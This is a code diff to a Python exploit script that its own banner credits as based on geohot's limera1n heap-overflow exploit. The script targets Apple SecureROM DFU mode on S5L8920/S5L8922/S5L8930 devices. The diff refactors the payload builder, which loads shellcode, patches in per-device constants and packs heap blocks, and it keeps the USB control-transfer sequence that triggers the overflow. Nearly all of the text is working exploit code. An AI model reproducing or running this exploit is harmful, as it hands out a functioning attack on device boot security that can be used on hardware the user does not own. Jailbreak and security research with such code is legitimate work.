@@ -106,9 +106,6 @@ constants_574_4 = [
         0x47db, # 22 - image3_load_fail
 ]
 
-SRTG_FORMAT = 'SRTG:[iBoot-%s]'
-CPID_FORMAT = 'CPID:%s'
-
 class DeviceConfig:
     def __init__(self, version, cpid, exploit_lr, max_size, constants):
         self.version = version
@@ -156,24 +153,20 @@ def limera1n_libusb1_async_ctrl_transfer(device, bmRequestType, bRequest, wValue
     usb.backend.libusb1._lib.libusb_cancel_transfer.argtypes = [ctypes.POINTER(usb.backend.libusb1._libusb_transfer)]
     assert usb.backend.libusb1._lib.libusb_cancel_transfer(transfer_ptr) == 0
 
-def generate_payload(chosenConfig):
-    SHELLCODE_ADDRESS = 0x84000400 + 1
-    MAX_SHELLCODE_LENGTH = 1024
-    f = open('bin/limera1n-shellcode.bin', 'rb')
-    shellcode = f.read()
-    f.close()
-    assert len(shellcode) <= MAX_SHELLCODE_LENGTH
+def generate_payload(constants, exploit_lr):
+    with open('bin/limera1n-shellcode.bin', 'rb') as f:
+        shellcode = f.read()
 
     # Shellcode has placeholder values for constants; check they match and replace with constants from config
-    placeholders_offset = len(shellcode) - 4 * len(chosenConfig.constants)
-    for i in range(len(chosenConfig.constants)):
+    placeholders_offset = len(shellcode) - 4 * len(constants)
+    for i in range(len(constants)):
         offset = placeholders_offset + 4 * i
         (value,) = struct.unpack('<I', shellcode[offset:offset + 4])
         assert value == 0xBAD00001 + i
 
-    heap_block = struct.pack('<4I', 0x405, 0x101, SHELLCODE_ADDRESS, chosenConfig.exploit_lr) + '\xCC' * 48
-    shellcode = shellcode[:placeholders_offset] + struct.pack('<%sI' % len(chosenConfig.constants), *chosenConfig.constants)
-    return heap_block * 16 + shellcode
+    shellcode_address = 0x84000400 + 1
+    heap_block = struct.pack('<4I48s', 0x405, 0x101, shellcode_address, exploit_lr, '\xCC' * 48)
+    return heap_block * 16 + shellcode[:placeholders_offset] + struct.pack('<%sI' % len(constants), *constants)
 
 def exploit():
     print '*** based on limera1n exploit (heap overflow) by geohot ***'
@@ -187,27 +180,24 @@ def exploit():
     
     chosenConfig = None
     for config in configs:
-        if SRTG_FORMAT % config.version in device.serial_number:
+        if 'SRTG:[iBoot-%s]' % config.version in device.serial_number:
             chosenConfig = config
             break
     if chosenConfig is None:
         for config in configs:
-            if CPID_FORMAT % config.cpid in device.serial_number:
+            if 'CPID:%s' % config.cpid in device.serial_number:
                 print 'ERROR: CPID is compatible, but serial number string does not match.'
                 print 'Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.'
                 sys.exit(1)
         print 'ERROR: Not a compatible device. This exploit is for S5L8920/S5L8922/S5L8930 devices only. Exiting.'
         sys.exit(1)
     
-    dfu.send_data(device, generate_payload(chosenConfig))
+    dfu.send_data(device, generate_payload(chosenConfig.constants, chosenConfig.exploit_lr))
 
-    #print 'Sending 0xA1,1 USB control request.'
     assert len(device.ctrl_transfer(0xA1, 1, 0, 0, 1, 100)) == 1
 
-    #print 'Sending 0x21,1 USB control request with 10ms timeout.'
     limera1n_libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 10)
 
-    #print 'Sending 0x21,2 USB control request.'
     try:
         device.ctrl_transfer(0x21, 2, 0, 0, 0, 1)
         print 'ERROR: This request succeeded, but it should have raised an exception. Exiting.'
